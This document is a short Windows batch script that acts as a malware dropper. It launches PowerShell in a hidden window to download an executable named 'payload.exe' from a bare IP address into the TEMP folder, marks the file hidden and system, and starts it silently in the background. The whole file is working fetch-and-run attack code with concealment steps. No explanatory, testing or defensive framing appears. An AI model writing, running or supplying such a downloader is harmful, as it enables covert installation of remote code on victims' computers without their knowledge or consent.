@echo off

powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'http://1.1.1.1/payload.exe' -OutFile $env:TEMP\payload.exe"

attrib +h +s "%TEMP%\payload.exe"

start "" /b "%TEMP%\payload.exe"

exit
